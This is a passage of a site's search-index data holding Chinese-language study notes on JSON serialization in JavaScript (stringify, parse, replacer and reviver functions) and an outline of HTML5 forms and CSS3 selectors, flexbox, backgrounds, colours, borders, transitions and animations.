};  这虽然是开发人员在JavaScript中创建对象字面量的标准方式，但JSON中的对象要求给属性加引号。实际上，在JavaScript中，前面的对象字面量完全可以写成下面这样：\nvar object = { \u0026quot;name\u0026quot;: \u0026quot;Nicholas\u0026quot;, \u0026quot;age\u0026quot;: 29 };  JSON表示上述对象的方式如下：\n{ \u0026quot;name\u0026quot;: \u0026quot;Nicholas\u0026quot;, \u0026quot;age\u0026quot;: 29 }  与JavaScript的对象字面量相比，JSON对象有两个地方不一样。首先，没有声明变量（JSON中没有变量的概念）。其次，没有末尾的分号（因为这不是JavaScript语句，所以不需要分号）。再说一遍，对象的属性必须加双引号，这在JSON中是必需的。属性的值可以是简单值，也可以是复杂类型值，因此可以像下面这样在对象中嵌入对象：\n{ \u0026quot;name\u0026quot;: \u0026quot;Nicholas\u0026quot;, \u0026quot;age\u0026quot;: 29, \u0026quot;school\u0026quot;: { \u0026quot;name\u0026quot;: \u0026quot;Merrimack College\u0026quot;, \u0026quot;location\u0026quot;: \u0026quot;North Andover, MA\u0026quot; } }  这个例子在顶级对象中嵌入了学校（\u0026rdquo;school\u0026rdquo;）信息。虽然有两个\u0026rdquo;name\u0026rdquo;属性，但由于它们分别属于不同的对象，因此这样完全没有问题。不过，同一个对象中绝对不应该出现两个同名属性。\n与JavaScript不同，JSON中对象的属性名任何时候都必须加双引号。手工编写JSON时，忘了给对象属性名加双引号或者把双引号写成单引号都是常见的错误。\n数组 JSON中的第二种复杂数据类型是数组。JSON数组采用的就是JavaScript中的数组字面量形式。例如，下面是JavaScript中的数组字面量：\nvar values = [25, \u0026quot;hi\u0026quot;, true];  在JSON中，可以采用同样的语法表示同一个数组：\n[25, \u0026quot;hi\u0026quot;, true]  同样要注意，JSON数组也没有变量和分号。把数组和对象结合起来，可以构成更复杂的数据集合，例如：\n[ { \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 3, year: 2011 }, { \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 2, year: 2009 }, { \u0026quot;title\u0026quot;: \u0026quot;Professional Ajax\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot;, \u0026quot;Jeremy McPeak\u0026quot;, \u0026quot;Joe Fawcett\u0026quot; ], edition: 2, year: 2008 }, { \u0026quot;title\u0026quot;: \u0026quot;Professional Ajax\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot;, \u0026quot;Jeremy McPeak\u0026quot;, \u0026quot;Joe Fawcett\u0026quot; ], edition: 1, year: 2007 }, { \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 1, year: 2006 } ]  这个数组中包含一些表示图书的对象。每个对象都有几个属性，其中一个属性是\u0026rdquo;authors\u0026rdquo;，这个属性的值又是一个数组。对象和数组通常是JSON数据结构的最外层形式（当然，这不是强制规定的），利用它们能够创造出各种各样的数据结构。\n解析与序列化 JSON之所以流行，拥有与JavaScript类似的语法并不是全部原因。更重要的一个原因是，可以把JSON数据结构解析为有用的JavaScript对象。与XML数据结构要解析成DOM文档而且从中提取数据极为麻烦相比，JSON可以解析为JavaScript对象的优势极其明显。就以上一节中包含一组图书的JSON数据结构为例，在解析为JavaScript对象后，只需要下面一行简单的代码就可以取得第三本书的书名：\nbooks[2].title  当然，这里是假设把解析后JSON数据结构得到的对象保存到了变量books中。再看看下面在DOM结构中查找数据的代码：\ndoc.getElementsByTagName(\u0026quot;book\u0026quot;)[2].getAttribute(\u0026quot;title\u0026quot;)  看看这些多余的方法调用，就不难理解为什么JSON能得到JavaScript开发人员的热烈欢迎了。从此以后，JSON就成了Web服务开发中交换数据的事实标准。\nJSON 对象 早期的JSON解析器基本上就是使用JavaScript的eval()函数。由于JSON是JavaScript语法的子集，因此eval()函数可以解析、解释并返回JavaScript对象和数组。ECMAScript 5对解析JSON的行为进行规范，定义了全局对象JSON。支持这个对象的浏览器有IE 8+、Firefox 3.5+、Safari 4+、Chrome和Opera 10.5+。对于较早版本的浏览器，可以使用一个shim：https://github.com/douglascrockford/JSON-js 在旧版本的浏览器中，使用eval()对JSON数据结构求值存在风险，因为可能会执行一些恶意代码。对于不能原生支持JSON解析的浏览器，使用这个shim是最佳选择。\nJSON对象有两个方法：==stringify()== 和 ==parse()==。在最简单的情况下，这两个方法分别用于把JavaScript对象序列化为JSON字符串和把JSON字符串解析为原生JavaScript值。例如：\nvar book = { title: \u0026quot;Professional JavaScript\u0026quot;, authors: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 3, year: 2011 }; var jsonText = JSON.stringify(book);  JSONStringifyExample01.htm\n这个例子使用JSON.stringify()把一个JavaScript对象序列化为一个JSON字符串，然后将它保存在变量jsonText中。默认情况下，JSON.stringify()输出的JSON字符串不包含任何空格字符或缩进，因此保存在jsonText中的字符串如下所示： 这个例子使用JSON.stringify()把一个JavaScript对象序列化为一个JSON字符串，然后将它保存在变量jsonText中。默认情况下，JSON.stringify()输出的JSON字符串不包含任何空格字符或缩进，因此保存在jsonText中的字符串如下所示：\n{\u0026quot;title\u0026quot;:\u0026quot;Professional JavaScript\u0026quot;,\u0026quot;authors\u0026quot;:[\u0026quot;Nicholas C. Zakas\u0026quot;],\u0026quot;edition\u0026quot;:3, \u0026quot;year\u0026quot;:2011}  ++在序列化JavaScript对象时，所有函数及原型成员都会被有意忽略，不体现在结果中。此外，值为undefined的任何属性也都会被跳过。++ 结果中最终都是值为有效JSON数据类型的实例属性。\n将JSON字符串直接传递给JSON.parse()就可以得到相应的JavaScript值。例如，使用下列代码就可以创建与book类似的对象：\nvar bookCopy = JSON.parse(jsonText);  注意，虽然book与bookCopy具有相同的属性，但它们是两个独立的、没有任何关系的对象。\n如果传给JSON.parse()的字符串不是有效的JSON，该方法会抛出错误。\n序列化选项 实际上，JSON.stringify()除了要序列化的JavaScript对象外，还可以接收另外两个参数，这两个参数用于指定以不同的方式序列化JavaScript对象。第一个参数是个过滤器，可以是一个数组，也可以是一个函数；第二个参数是一个选项，表示是否在JSON字符串中保留缩进。单独或组合使用这两个参数，可以更全面深入地控制JSON的序列化。\n 过滤结果  如果过滤器参数是数组，那么JSON.stringify()的结果中将只包含数组中列出的属性。来看下面的例子。\nvar book = { \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 3, year: 2011 }; var jsonText = JSON.stringify(book, [\u0026quot;title\u0026quot;, \u0026quot;edition\u0026quot;]);  JSONStringifyExample01.htm\nJSON.stringify()的第二个参数是一个数组，其中包含两个字符串：\u0026rdquo;title\u0026rdquo;和\u0026rdquo;edition\u0026rdquo;。这两个属性与将要序列化的对象中的属性是对应的，因此在返回的结果字符串中，就只会包含这两个属性：\n{\u0026quot;title\u0026quot;:\u0026quot;Professional JavaScript\u0026quot;,\u0026quot;edition\u0026quot;:3}  如果第二个参数是函数，行为会稍有不同。传入的函数接收两个参数，属性（键）名和属性值。根据属性（键）名可以知道应该如何处理要序列化的对象中的属性。属性名只能是字符串，而在值并非键值对儿结构的值时，键名可以是空字符串。\n为了改变序列化对象的结果，函数返回的值就是相应键的值。++不过要注意，如果函数返回了undefined，那么相应的属性会被忽略。++ 还是看一个例子吧。\nvar book = { \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 3, year: 2011 }; var jsonText = JSON.stringify(book, function(key, value){ switch(key){ case \u0026quot;authors\u0026quot;: return value.join(\u0026quot;,\u0026quot;) case \u0026quot;year\u0026quot;: return 5000; case \u0026quot;edition\u0026quot;: return undefined; default: return value; } });  JSONStringifyExample02.htm\n这里，函数过滤器根据传入的键来决定结果。如果键为\u0026rdquo;authors\u0026rdquo;，就将数组连接为一个字符串；如果键为\u0026rdquo;year\u0026rdquo;，则将其值设置为5000；如果键为\u0026rdquo;edition\u0026rdquo;，通过返回undefined删除该属性。最后，一定要提供default项，此时返回传入的值，以便其他值都能正常出现在结果中。实际上，第一次调用这个函数过滤器，传入的键是一个空字符串，而值就是book对象。序列化后的JSON字符串如下所示：\n{\u0026quot;title\u0026quot;:\u0026quot;Professional JavaScript\u0026quot;,\u0026quot;authors\u0026quot;:\u0026quot;Nicholas C. Zakas\u0026quot;,\u0026quot;year\u0026quot;:5000}  要序列化的对象中的每一个对象都要经过过滤器，因此数组中的每个带有这些属性的对象经过过滤之后，每个对象都只会包含\u0026rdquo;title\u0026rdquo;、\u0026rdquo;authors\u0026rdquo;和\u0026rdquo;year\u0026rdquo;属性。\nFirefox 3.5和3.6对JSON.stringify()的实现有一个bug，在将函数作为该方法的第二个参数时这个bug就会出现：过滤函数返回undefined意味着要跳过某个属性，而返回其他任何值都会在结果中包含相应的属性。Firefox 4修复了这个bug。\n 字符串缩进  JSON.stringify()方法的第三个参数用于控制结果中的缩进和空白符。如果这个参数是一个数值，那它表示的是每个级别缩进的空格数。例如，要在每个级别缩进4个空格，可以这样写代码：\nvar book = { \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 3, year: 2011 }; var jsonText = JSON.stringify(book, null, 4);  JSONStringifyExample03.htm\n保存在jsonText中的字符串如下所示：\n{ \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], \u0026quot;edition\u0026quot;: 3, \u0026quot;year\u0026quot;: 2011 }  不知道读者注意到没有，JSON.stringify()也在结果字符串中插入了换行符以提高可读性。++只要传入有效的控制缩进的参数值，结果字符串就会包含换行符。（只缩进而不换行意义不大。）最大缩进空格数为10，所有大于10的值都会自动转换为10。++\n如果缩进参数是一个字符串而非数值，则这个字符串将在JSON字符串中被用作缩进字符（不再使用空格）。在使用字符串的情况下，可以将缩进字符设置为制表符，或者两个短划线之类的任意字符。\nvar jsonText = JSON.stringify(book, null, \u0026quot; — -\u0026quot;);  这样，jsonText中的字符串将变成如下所示：\n{ \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], \u0026quot;edition\u0026quot;: 3, \u0026quot;year\u0026quot;: 2011 }  缩进字符串最长不能超过10个字符长。如果字符串长度超过了10个，结果中将只出现前10个字符。\n toJSON()方法  有时候，JSON.stringify()还是不能满足对某些对象进行自定义序列化的需求。在这些情况下，可以通过对象上调用toJSON()方法，返回其自身的JSON数据格式。原生Date对象有一个toJSON()方法，能够将JavaScript的Date对象自动转换成ISO 8601日期字符串（与在Date对象上调用toISOString()的结果完全一样）。\n可以为任何对象添加toJSON()方法，比如：\nvar book = { \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 3, year: 2011, toJSON: function(){ return this.title; } }; var jsonText = JSON.stringify(book);  JSONStringifyExample05.htm\n以上代码在book对象上定义了一个toJSON()方法，该方法返回图书的书名。与Date对象类似，这个对象也将被序列化为一个简单的字符串而非对象。可以让toJSON()方法返回任何序列化的值，它都能正常工作。也可以让这个方法返回undefined，此时如果包含它的对象嵌入在另一个对象中，会导致该对象的值变成null，而如果包含它的对象是顶级对象，结果就是undefined。\ntoJSON()可以作为函数过滤器的补充，因此理解序列化的内部顺序十分重要。假设把一个对象传入JSON.stringify()，序列化该对象的顺序如下。 1. 如果存在toJSON()方法而且能通过它取得有效的值，则调用该方法。否则，按默认顺序执行序列化。 2. 如果提供了第二个参数，应用这个函数过滤器。传入函数过滤器的值是第1步返回的值。 3. 对第2步返回的每个值进行相应的序列化。 4. 如果提供了第三个参数，执行相应的格式化。\n无论是考虑定义toJSON()方法，还是考虑使用函数过滤器，亦或需要同时使用两者，理解这个顺序都是至关重要的。\n解析选项 JSON.parse()方法也可以接收另一个参数，该参数是一个函数，将在每个键值对儿上调用。为了区别JSON.stringify()接收的替换（过滤）函数（replacer），这个函数被称为还原函数（reviver），但实际上这两个函数的签名是相同的——它们都接收两个参数，一个键和一个值，而且都需要返回一个值。\n如果还原函数返回undefined，则表示要从结果中删除相应的键；如果返回其他值，则将该值插入到结果中。在将日期字符串转换为Date对象时，经常要用到还原函数。例如：\nvar book = { \u0026quot;title\u0026quot;: \u0026quot;Professional JavaScript\u0026quot;, \u0026quot;authors\u0026quot;: [ \u0026quot;Nicholas C. Zakas\u0026quot; ], edition: 3, year: 2011, releaseDate: new Date(2011, 11, 1) }; var jsonText = JSON.stringify(book); var bookCopy = JSON.parse(jsonText, function(key, value){ if (key == \u0026quot;releaseDate\u0026quot;){ return new Date(value); } else { return value; } }); alert(bookCopy.releaseDate.getFullYear());  JSONParseExample02.htm\n以上代码先是为book对象新增了一个releaseDate属性，该属性保存着一个Date对象。这个对象在经过序列化之后变成了有效的JSON字符串，然后经过解析又在bookCopy中还原为一个Date对象。还原函数在遇到\u0026rdquo;releaseDate\u0026rdquo;键时，会基于相应的值创建一个新的Date对象。结果就是bookCopy.releaseDate属性中会保存一个Date对象。正因为如此，才能基于这个对象调用getFullYear()方法。\n小结 JSON是一个轻量级的数据格式，可以简化表示复杂数据结构的工作量。JSON使用JavaScript语法的子集表示对象、数组、字符串、数值、布尔值和null。即使XML也能表示同样复杂的数据结果，但JSON没有那么烦琐，而且在JavaScript中使用更便利。\nECMAScript 5定义了一个原生的JSON对象，可以用来将对象序列化为JSON字符串或者将JSON数据解析为JavaScript对象。JSON.stringify()和JSON.parse()方法分别用来实现上述两项功能。这两个方法都有一些选项，通过它们可以改变过滤的方式，或者改变序列化的过程。\n原生的JSON对象也得到了很多浏览器的支持，比如IE8+、Firefox 3.5+、Safari 4+、Opera 10.5和Chrome。\n参考 javascript 高级程序设计 【第3版】\n","permalink":"http://localhost:8000/public/post/json-javascript-object-notation-%E5%AD%A6%E4%B9%A0/","tags":["javascript","json","learning-notes"],"title":"JSON (Javascript Object Notation) 学习"},{"categories":["Front-End","搬运整理"],"contents":" 转载自Poetry\u0026rsquo;s Blog\n 这篇文章主要总结H5的一些新增的功能以及一些基础归纳，这里只是一个提纲，并不是很详细，后面会一直完善补充新的内容，本文是一些笔记记录，放在这里供自己参考也供他人学习！ 第一课 HTML5结构  HTML5 是新一代的 HTML DTD声明改变 \u0026lt;!DOCTYPE html\u0026gt;  新的结构标签\n   常用的一些新的结构标签  补充说明  small 这个元素表示边栏评论，如附属细则 cite这个元素可用于显示作品标题（图书、电影、诗歌等） adress这个元素显示article或整个文档的合同信息，且位于footer这个元素之中 time显示人和机器可读的日期和时间，而且机器可读的时间戳是属性datetime的值第二个可选的是pubtime用于表示出版日期值   删除的HTML标签  纯表现的元素：  basefont big center font s strike tt u  对可用性产生负面影响的元素：  frame frameset noframes 产生混淆的元素： acronym applet isindex dir  重新定义的HTML标签\n \u0026lt;b\u0026gt; 代表内联文本，通常是粗体，没有传递表示重要的意思 \u0026lt;i\u0026gt; 代表内联文本，通常是斜体，没有传递表示重要的意思 \u0026lt;dd\u0026gt; 可以同details与figure一同使用，定义包含文本，dialog也可用 \u0026lt;dt\u0026gt; 可以同details与figure一同使用，汇总细节，dialog也可用 \u0026lt;hr\u0026gt;表示主题结束，而不是水平线，虽然显示相同 \u0026lt;menu\u0026gt; 重新定义用户界面的菜单，配合commond或者menuitem使用 \u0026lt;small\u0026gt; 表示小字体，例如打印注释或者法律条款 \u0026lt;strong\u0026gt; 表示重要性而不是强调符号  崭新新的页面布局\n  第二课 HTML5智能表单 HTML4.01 form表单复习  input表单type属性值  type=\u0026quot;text\u0026quot; 单行文本输入框 type=\u0026quot;password\u0026quot; 密码（maxlength=\u0026quot;\u0026quot;） type=\u0026quot;radio\u0026quot; 单项选择（checked=\u0026quot;checked\u0026quot;） type=\u0026quot;checkbox\u0026quot; 多项选择 type=\u0026quot;button\u0026quot; 按钮 type=\u0026quot;submit\u0026quot; 提交 type=\u0026quot;file\u0026quot; 上传文件 type=\u0026quot;reset\u0026quot; 重置   HTML5智能表单  input表单type属性值：  type = \u0026quot;email\u0026quot; 限制用户输入必须为Email类型 type=\u0026quot;url\u0026quot; 限制用户输入必须为URL类型 type=\u0026quot;date\u0026quot; 限制用户输入必须为日期类型 type=\u0026quot;datetime\u0026quot; 显示完整日期 含时区 type=\u0026quot;datetime-local\u0026quot; 显示完整日期 不含时区 type=\u0026quot;time\u0026quot; 限制用户输入必须为时间类型 type=\u0026quot;month\u0026quot; 限制用户输入必须为月类型 type=\u0026quot;week\u0026quot; 限制用户输入必须为周类型 type=\u0026quot;number\u0026quot; 限制用户输入必须为数字类型 type=\u0026quot;range\u0026quot; 生成一个滑动条 type=\u0026quot;search\u0026quot; 具有搜索意义的表单results=\u0026quot;n\u0026quot;属性 type=\u0026quot;color\u0026quot; 生成一个颜色选择表单 type=\u0026quot;tel\u0026quot; 显示电话号码   Input 类型 - Date Pickers（日期选择器）  **HTML5 拥有多个可供选取日期和时间的新输入类型： date 选取日、月、年 month 选取月、年 week 选取周和年 time 选取时间（小时和分钟）\n 以下两个没有作用\n datetime 选取时间、日、月、年（UTC 时间） datetime-local 选取时间、日、月、年（本地时间）   HTML5新增表单属性  required: required内容不能为空 placeholder: 表单提示信息 autofocus:自动聚焦 pattern: 正则表达式 输入的内容必须匹配到指定正则范围 autocomplete:是否保存用户输入值  默认为on，关闭提示选择off  formaction: 在submit里定义提交地址 datalist: 输入框选择列表配合list使用 list值为datalist的id值 output: 计算或脚本输出  表单验证  validity对象，通过下面的valid可以查看验证是否通过，如果八种验证都返回true,一种验证失败返回false\n oText.addEventListener(\u0026quot;invalid\u0026quot;,fn1,false) ev.preventDefault(): 阻止默认事件 valueMissing: 当输入值为空的时候，返回true typeMismatch: 控件值与预期不吻合，返回true patternMismatch: 输入值不满足pattern正则，返回true cusomError  setCustomValidity()     第三课 css3选择器  CSS3发展史简介\n HTML的诞生 20世纪90年代初 1996年底， CSS第一版诞生 1998年5月 CSS2正式发布 2004年 CSS2.1发布 CSS3的发布 2002 2003 2004 2005 2007 2009 2010  模块化开发\n CSS1 中定义了网页的基本属性：  字体、颜色、基本选择器等  CSS2中在CSS1的基础上添加了高级功能  浮动和定位、高级选择器等(子选择器、相邻选择器、通用选择器)  CSS3遵循的是模块化开发。发布时间并不是一个时间点，而是一个时间段   CSS选择器复习  通用选择器：* 选择到所有的元素 选择子元素：\u0026gt; 选择到元素的直接后代 相邻兄弟选择器：+选择到紧随目标元素后的第一个元素 普通兄弟选择器：~选择到紧随其后的所有兄弟元素 伪元素选择器：  ::first-line 匹配文本块的首行 ::first-letter 选择文本块的首字母  伪类选择器：\n :before,:after在元素内容前面、后面添加内容(相当于行内元素)  CSS3结构选择器\n   Css3 属性选择器   CSS3伪类选择器\n UI伪类选择器： :enabled选择启用状态元素 :disabled 选择禁用状态元素 :checked选择被选中的input元素（单选按钮或复选框） :default 选择默认元素 :valid、invalid 根据输入验证选择有效或无效的input元素 :in-range、out-of-range选择指定范围之内或者之外受限的元素 :required、optional根据是否允许:required属性选择input元素\n 动态伪类选择器：\n :link选择链接元素\n :visited 选择用户以访问的元素\n :hover 鼠标悬停其上的元素\n :active鼠标点击时触发的事件\n :focus 当前获取焦点的元素\n 其他伪类选择器：\n :not(\u0026lt;选择器\u0026gt;)对括号内选择器的选择取反\n :lang(\u0026lt;目标语言\u0026gt;) 基于lang全局属性的元素\n :target url片段标识符指向的元素\n :empty选择内容为空的元素  :selection鼠标光标选择元素内容\n   第四课 CSS3新增文本属性 CSS文本属性复习  white-space：对象内空格的处理方式\n nowrap 控制文本不换行\n pre 空白会被浏览器保留\n pre-line 合并空白 保留换行符\n pre-wrap 保留空白 正常换行\n  direction：文本流的方向\n ltr 文本从左向右 rtl 文本从右往左  unicode-bidi：用于同一个页面里存在从不同方向读进的文本显示。与direction属性一起使用\n  CSS3新增文本属性  color:rgba(); text-overflow:是否使用一个省略标记（\u0026hellip;）标示对象内文本的溢出 text-align:文本的对齐方式 text-transform:文字的大小写 text-decoration:文本的装饰线，复合属性 text-shadow:文本阴影 text-fill-color:文字填充颜色 text-stroke:复合属性。设置文字的描边 tab-size:制表符的长度 word-wrap:当前行超过指定容器的边界时是否断开转行 word-break:规定自动换行的处理方法   text-overflow:是否使用一个省略标记（...）标示对象内文本的溢出\n clip： 默认值 无省略号 ellipsis：当对象内文本溢出时显示省略标记（...）。 注意：该属性需配合over-flow:hidden属性(超出处理)还有 white-space:nowrap(禁止换行)配合使用，否则无法看到效果  text-align:文本的对齐方式\n css1 left:默认值 左对齐 right:右对齐 center:居中 justify： 内容两端对齐。 css3 start:开始边界对齐 end:结束边界对齐  text-transform:文字的大小写\n css1  none： 默认值 无转换 capitalize： 将每个单词的第一个字母转换成大写 uppercase： 转换成大写 lowercase： 转换成小写  css3  full-width： 将左右字符设为全角形式。不支持 full-size-kana：将所有小假名字符转换为普通假名。不支持  例如：土耳其语    text-decoration:文本的装饰线，复合属性(只火狐支持)\n text-decoration-line：  指定文本装饰的种类。相当于CSS1时的text-decoration属性  text-decoration-style ：  `指定文本装饰的样式。  text-decoration-color：  `指定文本装饰的颜色。  blink： 指定文字的装饰是闪烁。 opera和firefox text-decoration : #F00 double overline CSS3实例  text-shadow:文本阴影\n 取值：x y blur color,\u0026hellip;\u0026hellip;  x 横向偏移 y 纵向偏移 blur 模糊距离(灰度) color 阴影颜色   text-fill-color:文字填充颜色\n text-stroke:复合属性。设置文字的描边\n text-stroke-width:文字的描边厚度 text-stroke-color:文字的描边颜色  tab-size:制表符的长度\n 默认值为8(一个tab键的空格字节长度)，在 pre标签之内才会有显示  word-wrap:当前行超过指定容器的边界时是否断开转行\n normal： 默认值 允许内容顶开或溢出指定的容器边界。  break-word：\n 内容将在边界内换行。如果需要，单词内部允许断行    第五课 CSS3盒模型  CSS盒模型复习  CSS3弹性盒模型  以下6个属性设置在容器上  flex-direction flex-wrap flex-flow justify-content align-items align-content  属性详解\n flex-direction: row | row-reverse | column | column-reverse; flex-wrap: nowrap | wrap | wrap-reverse; flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap  flex-flow: \u0026lt;flex-direction\u0026gt; || \u0026lt;flex-wrap\u0026gt;;  justify-content属性定义了项目在主轴上的对齐方式。  justify-content: flex-start | flex-end | center | space-between | space-around;  align-items属性定义项目在交叉轴上如何对齐。  align-items: flex-start | flex-end | center | baseline | stretch;  align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。  align-content: flex-start | flex-end | center | space-between | space-around | stretch;   以下6个属性设置在项目上\n order flex-grow flex-shrink flex-basis flex align-self  属性详解\n order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0 flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。 flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。 flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。 flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。 align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。  align-self: auto | flex-start | flex-end | center | baseline | stretch;     拓展阅读  flex布局语法篇 flex布局实例篇   第六课 css3新增背景属性  CSS背景属性复习\n background:  background-color:背景颜色 background-image:背景图片 background-repeat:背景重复 background-position:背景定位 background-attachment:背景固定(scroll/fixed)   CSS3新增背景属性\n background-size 背景尺寸\n background-size:x y 水平 垂直方向的尺寸，像素/百分比/auto/… background-size:100% 100% background-size:cover 比例放大 background-size:contain 包含（图片不溢出）  多背景\n background-image:url(1.jpg),url(2.jpg);  background-origin 背景区域定位\n border-box： 从border区域开始显示背景。 padding-box： 从padding区域开始显示背景。 content-box： 从content内容区域开始显示背  background-clip 背景绘制区域\n border-box： 从border区域向外裁剪背景。 padding-box： 从padding区域向外裁剪背景。 content-box： 从content区域向外裁剪背景。  text:背景填充文本\n no-clip： 从border区域向外裁剪背景   颜色渐变\n 线性渐变：linear-gradient(起点/角度，颜色 位置，\u0026hellip;,)\n 起点：left/top/right/bottom/left top......默认top 角度：逆时针方向 0-360度 颜色 位置：red 50%, blue 100%(红色从50%渐变到100%为蓝色)  repeating-linear-gradient 线性渐变重复平铺\n IE低版本渐变(滤镜)： filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#ff0000',GradientType='1');  径向渐变：radial-gradient(起点(圆心位置), 形状/半径/大小，颜色1，颜色2)\n 起点：left/top/right/bottom或具体值/百分比 形状：ellipse(椭圆)、circle(正圆) 大小：具体数值或百分比，也可以是关键字（closest-side(最近端), closest-corner最近角), farthest-side(最远端), farthest-corner(最远角), contain(包含) ,cover(覆盖)）;    第七课 css3新增颜色属性  CSS颜色属性复习\n color name 颜色英文名称命名 HEX方式 十六进制方式 rgb方式 三原色配色方式  CSS3新增颜色属性\n rgba()      名称 颜色 颜色 取值     r red 红色 0-255   g green 绿色 0-255   b blue 蓝色 0-255   a alpha 透明 0-1     HSL模式 HSLA模式\n H： Hue(色调)。  0(或360)表示红色，120表示绿色，240表示蓝色，也可取其他数值来指定颜色。取值为：0 - 360  S：Saturation(饱和度)。取值为：0.0% - 100.0% L： Lightness(亮度)。取值为：0.0% - 100.0% A: alpha 透明度 0~1之间\n 语法:HSLA(H,S,L,A)\n  HSL色轮\n   透明颜色：transparent\n 实例：border实现三角箭头、风车等  透明度：\n opacity 取值：0-1之间 注：低版本的IE浏览器不兼容,需用IE浏览器的滤镜实现相同效果，filter:alpha(opacity=50) 对于低版本的火狐浏览器需添加内核前缀，-moz-opacity   第八课 CSS3边框系列 圆角-阴影  边框圆角\n 在CSS2中添加圆角矩形需要技巧。我们必须为每个圆角使用不同的图片 在 CSS3中，创建圆角是非常容易的 在CSS3中，border-radius属性用于创建圆角   border-radius边框圆角写法\n border-radius: 2em 1em 4em / 0.5em 3em; 等价于   border-top-left-radius: 2em 0.5em; border-top-right-radius: 1em 3em; border-bottom-right-radius: 4em 0.5em; border-bottom-left-radius: 1em 3em;   box-shadow方框添加阴影\n 语法：box-shadow:x-shadow y-shadow blur spread color inset;\n box-shadow的API\n x-shadow 必需。水平阴影的位置。允许负值。\n y-shadow 必需。垂直阴影的位置。允许负值。\n blur 可选。模糊距离。\n spread 可选。阴影的尺寸。\n color 可选。阴影的颜色。请参阅 CSS颜色值\n inset 可选。将外部阴影 (outset) 改为内部阴影  实例：box-shadow:10px 10px 5px 5px #888888;\n   边框系列-图片  border-image语法     属性 版本 简介     border-image CSS3 设置或检索对象的边框使用图像来填充   border-image-source CSS3 设置或检索对象的边框是否用图像定义样式或图像来源路径   border-image-slice CSS3 设置或检索对象的边框背景图的分割方式   border-image-width CSS3 设置或检索对象的边框厚度   border-image-outset CSS3 设置或检索对象的边框背景图的扩展   border-image-repeat CSS3 设置或检索对象的边框图像的平铺方式     border-image-slice  设置或检索对象的边框背景图的分割方式     border-image-repeat  用于指定边框背景图的重复方式 取值： stretch： 指定用拉伸方式来填充边框背景图。 *默认的 repeat： 指定用平铺方式来填充边框背景图。当图片碰到边界时，如果超过则被截断。 round： 指定用平铺方式来填充边框背景图。图片会根据边框的尺寸动态调整图片的大小 直至正好可以铺满整个边框。写本文档时仅Firefox能看到该效果    第九课 CSS3运动体系 过渡  过渡：给改变添加过程\n 什么是过渡 过渡效果由哪几部分组成 过渡可以干些什么   transition 过渡属性\n transition: property duration timing-function delay;\n transition-property:过渡属性的名称  none 没有过渡属性 all 所有属性都过渡(默认值) property 具体属性名称(property1,property2\u0026hellip;)  transition-duration:过渡属性花费的时间  time 秒或毫秒  transition-timing-function:过渡效果速度曲线  time 秒或毫秒  transition-delay:过渡效果延迟时间   transition-timing-function:过渡效果速度曲线\n linear:规定以相同速度开始至结束的过渡效果（等于 cubic-bezier(0,0,1,1)）。 ease:规定慢速开始，然后变快，然后慢速结束的过渡效果（cubic-bezier(0.25,0.1,0.25,1)）。 ease-in:规定以慢速开始的过渡效果（等于 cubic-bezier(0.42,0,1,1)）。 ease-out :规定以慢速结束的过渡效果（等于 cubic-bezier(0,0,0.58,1)）。 ease-in-out :规定以慢速开始和结束的过渡效果（等于 cubic-bezier(0.42,0,0.58,1)）。 cubic-bezier(n,n,n,n):在 cubic-bezier 函数中定义自己的值。可能的值是 0至 1 之间的数值。  过渡完成事件\n Webkit内核：\n  obj.addEventListener('webkitTransitionEnd',function(){})   标准:  obj.addEventListener('transitionend',function(){})  动画  什么是CSS3 动画？\n 通过 CSS3，我们能够创建动画，这可以在许多网页中取代动画图片、Flash 动画以及 JavaScript  动画接口\n     属性 描述     @keyframes 规定动画。   animation 所有动画属性的简写属性，除了 animation-play-state 属性。   animation-name 规定 @keyframes 动画的名称。   animation-duration 规定动画完成一个周期所花费的秒或毫秒。   animation-timing-function 规定动画的速度曲线。   animation-delay 规定动画何时开始。   animation-iteration-count 规定动画被播放的次数。   animation-direction 规定动画是否在下一周期逆向地播放。   animation-play-state 规定动画是否正在运行或暂停。   animation-fill-mode 规定对象动画时间之外的状态。     animation-timing-function速度曲线     值 